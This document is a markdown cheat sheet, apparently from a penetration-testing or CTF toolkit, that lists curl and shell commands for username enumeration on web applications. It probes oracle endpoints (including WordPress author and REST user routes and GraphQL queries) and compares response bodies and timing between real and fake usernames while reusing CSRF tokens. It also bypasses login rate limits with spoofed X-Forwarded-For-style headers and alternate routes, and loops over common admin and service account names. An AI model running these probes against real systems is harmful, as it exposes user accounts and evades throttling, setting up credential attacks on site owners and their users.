# Probe map — every command, indexed by purpose

## The inventory probes (recon, free)

```bash
# the bundle -> the check/available/users endpoints
python3 tools/web/bundle_miner.py --url "$BASE" --out /tmp/bundle
grep -riE 'check|available|exists|username|user-exists|taken|/users/' /tmp/bundle
# the forms
curl -s "$BASE" | grep -oE '<form[^>]*>|<input[^>]*name="[^"]*"'
# the headers -> the counter-key
curl -sI "$BASE" | grep -iE 'x-ratelimit|retry-after|server|x-frame'
```

## The direct-oracle probes

```bash
curl "$BASE/api/username-available?u=$U"
curl "$BASE/check-username?u=$U"
curl "$BASE/api/users/$U"
curl -X POST -d "{\"query\":\"query{userByEmail(email:\\\"$U\\\"){id}}\"}" "$BASE/graphql"
curl -X POST -d "{\"query\":\"query{checkUser(username:\\\"$U\\\")}\"}" "$BASE/graphql"
curl "$BASE/?author=1"     # the WP pattern
curl "$BASE/wp-json/wp/v2/users"
```

## The three-arm channel probes (per form)

```bash
# setup — the CSRF/session
cj=/tmp/cj; rm -f $cj
tok() { curl -sc $cj "$FORM" | grep -oE 'name="(csrf|_token)[^"]*" value="[^"]*"'|head -1|cut -d'"' -f4; }
# body — masked
curl -sb $cj -i -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)" "$FORM" > g
curl -sb $cj -i -X POST -d "user=$FAKE&pass=x&csrf=$(tok)"  "$FORM" > b
curl -sb $cj -i -X POST -d "user=$FAKE2&pass=x&csrf=$(tok)" "$FORM" > b2
mask() { sed -E 's/(csrf|nonce|token|_ts|request_id)[^<"& ]*//g;s/value="[^"]*"//g;s/[a-zA-Z0-9+/=]{20,}//g'; }
diff <(mask<g) <(mask<b); diff <(mask<b) <(mask<b2)
# status + Location
curl -sb $cj -s -D - -o /dev/null -X POST -d "user=$U&pass=x&csrf=$(tok)" "$FORM" | grep -iE '^HTTP|^location'
# timing — N>=8 interleaved
for i in $(seq 10); do
  curl -sb $cj -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)&_=$i" "$FORM"
  curl -sb $cj -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE&pass=x&csrf=$(tok)&_=$i" "$FORM"
done
# side — the envelope
curl -sb $cj -sv -X POST -d "user=$U&pass=x&csrf=$(tok)" "$FORM" 2>&1 | grep -iE 'set-cookie|x-|emails|attempts'
```

## The throttle probes

```bash
# absent/threshold burst
for i in $(seq 15); do curl -o /dev/null -w "$i %{http_code} %{time_total}\n" -X POST -d "user=t$i&pass=x" "$BASE/login"; done
# the lock — on YOUR own KNOWN only
for i in $(seq 12); do curl -o /dev/null -w '%{http_code} ' -X POST -d "user=$KNOWN&pass=x" "$BASE/login"; done
# the bypass — the counter-key
for h in X-Forwarded-For X-Real-IP X-Client-IP; do
  curl -o /dev/null -w '%{http_code} ' -H "$h: $RANDOM.$RANDOM.$RANDOM.$RANDOM" -X POST -d 'user=x&pass=y' "$BASE/login"
done
# fresh session, alias, method, content-type
curl -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/login"           # fresh
curl -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/api/login"       # alias
curl -o /dev/null -w '%{http_code}\n' -X GET "$BASE/login?user=x&pass=y"                 # method
curl -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' -d '{"username":"x","password":"y"}' "$BASE/login"  # CT
```

## The candidate-name probes

```bash
# through the confirmed oracle
for u in admin administrator root test demo user guest flag service backup deploy system support operator monitoring superuser sa ci jenkins gitlab; do
  printf '%-14s ' "$u"; curl -s "$BASE/api/username-available?u=$u"
done
```

## The verify probes (per verdict)

```bash
# the three arms — always
diff <(mask<g) <(mask<b) && diff <(mask<b) <(mask<b2)
# the re-run — the timing must repeat
# the second bad name — the delta is the username-class, not a one-off
```
